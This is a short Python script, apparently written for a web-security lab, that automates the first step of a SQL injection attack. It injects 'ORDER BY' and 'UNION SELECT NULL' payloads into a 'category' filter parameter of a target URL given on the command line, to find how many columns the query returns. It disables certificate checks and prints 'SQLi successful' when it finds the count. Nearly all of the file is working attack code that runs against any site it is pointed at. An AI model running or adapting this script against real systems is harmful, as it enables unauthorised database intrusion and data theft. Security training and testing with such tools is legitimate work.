#Determining the number of columns returned by the query
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http:127.0.0.1:8080", "https": "http:127.0.0.1:8080"}
path = 'filter?category='

def forOrderBy(url):
	for i in range(1,20):
		payload = f"' Order by {i}--"
		r = requests.get(url + path + payload, verify=False)
		if 'Internal Server Error' in r.text:
			return i - 1
	return False

def forUnionSelect(url):
	for i in range(1,20):
		num_null = ["NULL"] * i
		num_null_final = ','.join(num_null)
		payload = f"' UNION SELECT {num_null_final}--"
		r = requests.get(url + path + payload, verify=False)
		if 'Refine your search' in r.text:
			return i
	return False


def exploit_sqli(url):
	print(f'\033[32mW3lc0me:\nSelect query to know the number of colummns:\033[0m')
	option = int(input('\033[33m1: Order By\n2: UNION SELECT NULL\n> \033[0m'))
	if option == 1:
		print('Figuring out number of columns...')
		num_col = forOrderBy(url)
		return num_col
	elif option == 2:
		print('Figuring out number of columns...')
		num_col = forUnionSelect(url)
		return num_col
	else:
		print('\033[31mSelect a valid option!!!\033[0m')
		return False


if __name__ == "__main__":
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print(f'\033[31m[-] Usage: {sys.argv[0]} <url>\033[0m')
		print(f'\033[31m[-] Example: {sys.argv[0]} www.example.com\033[0m')
		sys.exit(1)

	try:
		num_col = exploit_sqli(url)
		if num_col:
			print(f'\033[32m[+] Number columns is {num_col}\033[0m')
			print('\033[32m[+] SQLi successful!\033[0m')
			sys.exit(0)
		else:
			print('\033[31m[-] SQLi unsucessful!\033[0m')
			sys.exit(1)
	except KeyboardInterrupt:
		print('\n\033[34m[+] Exited... \033[0m')
		sys.exit(0)
